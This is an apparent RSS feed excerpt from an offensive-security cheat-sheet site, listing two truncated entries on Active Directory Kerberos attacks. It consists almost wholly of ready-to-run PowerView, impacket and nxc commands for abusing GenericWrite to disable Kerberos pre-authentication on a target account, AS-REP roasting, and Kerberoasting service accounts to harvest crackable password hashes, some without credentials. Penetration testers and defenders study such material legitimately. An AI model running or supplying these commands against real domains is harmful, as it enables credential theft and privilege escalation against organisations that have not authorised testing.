channel.title: Kerberoasting on TLDRBins
channel.description: Recent content in Kerberoasting on TLDRBins

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC> Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC> # Single user without creds impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER> # Multiple valid usernames nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.
